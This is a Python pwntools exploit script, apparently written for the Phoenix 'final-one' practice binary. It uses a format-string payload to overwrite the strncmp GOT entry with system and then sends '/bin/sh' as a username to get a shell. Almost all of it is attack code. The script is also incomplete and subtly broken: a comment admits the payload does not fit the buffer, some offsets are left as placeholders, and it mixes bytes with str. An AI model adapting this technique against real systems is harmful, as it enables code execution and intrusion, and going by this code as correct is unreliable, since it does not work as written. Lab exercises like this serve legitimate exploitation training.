#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"
path = "/opt/phoenix/amd64/final-one"
elf = context.binary = path
context.arch = "amd64"

# io = remote("127.0.0.1", 64004)
io = process([path, "--test"])

# hostname = 127.0.0.1, assume ephemeral port is 5 digits
username = b"username a"
# test_prefix = b"Login from testing:12121 as [a] with password [a"
prefix = b"Login from 127.0.0.1:xxxxx as [a] with password [aaaaaaa"
strncmp_gotplt = 0x6011F8

# system = 0x7ffff7daed9c
# | 9c ed | da f7 | ff 7f | 00 00 |
# (0xed9c) (0xf7da)(0x7fff)
#    2        3        1
count1 = str(0x7FFF - len(prefix)).encode("ascii")
count2 = str(0xED9C - 0x7FFF).encode("ascii")
count3 = str(0xF7DA - 0xED9C).encode("ascii")

# NOTE: The payload doesn't fit in the line buffer. Theoretically it would
# work if line buffer is at least a ~200 bytes large

# overwrite strncmp GOT entry with system
# need to make sure len(password) <= 127
password = b"login aaaaaaa"
# reach start of format string specifiers
password += b"%.0s" * 13
# reach the addresses
# password += b"%.0s" * ?
# zero the upper 2 bytes of strncmp@got.plt
password += b"%lln"
# write 0x7fff bytes
password += b"%" + count1 + "c"
password += b"%hn"
# write 0xed9c bytes
password += b"%" + count2 + "c"
password += b"%hn"
# write 0xf7da bytes
password += b"%" + count3 + "c"
password += b"%hn"
# password += b"A" * ?  # padding
# addresses...
password += pack(strncmp_gotplt)
password += b"A"
password += pack(strncmp_gotplt + 4)
password += b"A"
password += pack(strncmp_gotplt)
password += b"A"
password += pack(strncmp_gotplt + 2)
io.sendline(username)
io.sendline(password)
io.recv()
io.sendline("username /bin/sh")
io.recv()
# io.interactive()
